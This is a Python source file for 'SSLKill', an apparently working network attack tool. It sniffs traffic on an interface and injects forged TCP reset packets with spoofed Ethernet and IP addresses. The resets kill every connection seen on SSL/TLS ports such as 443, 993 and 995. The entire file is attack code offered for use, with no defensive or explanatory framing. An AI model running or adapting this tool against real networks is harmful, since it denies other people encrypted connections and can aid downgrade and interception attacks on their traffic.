#! /usr/bin/env python

#Author: Dylan Halls

import os
import sys
import socket
import libnet
import base64
import random
from libnet.constants import *
os.sys.path.append(os.path.dirname(os.path.abspath('.'))) #fix import path
from sniffer.sniffer import Sniffer

class SSLKill(object):
    """
    rst hijacks any seen ssl tcp connections
    """
    def __init__(self, arg):
        super(SSLKill, self).__init__()
        self.iface         = arg
        self.unique_id     = base64.b64encode(str(random.randint(0, 10000)))
        self.sniffer       = Sniffer()
        self.blocked_ports = [443, 465, 563, 585, 636, 695, 898,
                              989, 990, 992, 993, 994, 995]
        self.sniffer.init(self.iface)

    def pkt_builder(self, packet):
        self.wire = libnet.context(LINK, self.iface)
        tcptag = self.wire.build_tcp(
                                     dp      = packet['TCP_SPORT'],
                                     sp      = packet['TCP_DPORT'],
                                     control = TH_RST,
                                     seq     = packet['TCP_ACK_NUM'],
                                     ack     = packet['TCP_SEQ_NUM']+1,
                                     payload = self.unique_id
                                    )

        iptag = self.wire.build_ipv4(
                                     prot = IPPROTO_TCP,
                                     dst  = socket.inet_aton(packet['IP_SRC']),
                                     src  = socket.inet_aton(packet['IP_DST'])
                                    )

        ethtag = self.wire.build_ethernet(
                                          dst = self.wire.hex_aton(packet['ETH_SHOST']),
                                          src = self.wire.hex_aton(packet['ETH_DHOST'])
                                         )

    def reset(self, packet):
        src = packet['IP_SRC']
        dst = packet['IP_DST']

        try:
            src_host = socket.gethostbyaddr(src)[0]
            dst_host = socket.gethostbyaddr(dst)[0]
        except socket.herror:
            src_host = src
            dst_host = dst

        print("[SSLKill] [\033[1;31mResetting\033[00m]: {} <-> {}".format(src_host, dst_host))
        self.wire.write()
        del self.wire

    def _check_ssl(self, packet):
        sport = packet['TCP_SPORT']
        for port in self.blocked_ports:
            if sport == port:
                return 1
        return -1

    def pkt_handle(self, packet):
        try:
            if packet['IP_PROTO'] == IPPROTO_TCP:
                if self.unique_id not in packet['TCP_PAYLOAD']:
                    if self._check_ssl(packet) != -1:
                        self.pkt_builder(packet)
                        self.reset(packet)
                    else:
                        src = packet['IP_SRC']
                        dst = packet['IP_DST']
                        try:
                            dst_host = socket.gethostbyaddr(dst)[0]
                            src_host = socket.gethostbyaddr(src)[0]
                        except socket.herror:
                            dst_host = dst
                            src_host = src
                        print("[SSLKill] [\033[1;32mAllowing\033[00m]: {} <-> {}".format(src_host, dst_host))
        except KeyError: return -1

    def kill(self):
        while True:
            try:
                self.pkt_handle(self.sniffer.sniff())
            except KeyboardInterrupt:
                self.sniffer.shutdown()
                print "\r"
                exit(1)

if __name__ == '__main__':
    iface = sys.argv[1]
    killer = SSLKill(iface)
    print "SSLKill by Dylan Halls running..."
    killer.kill()
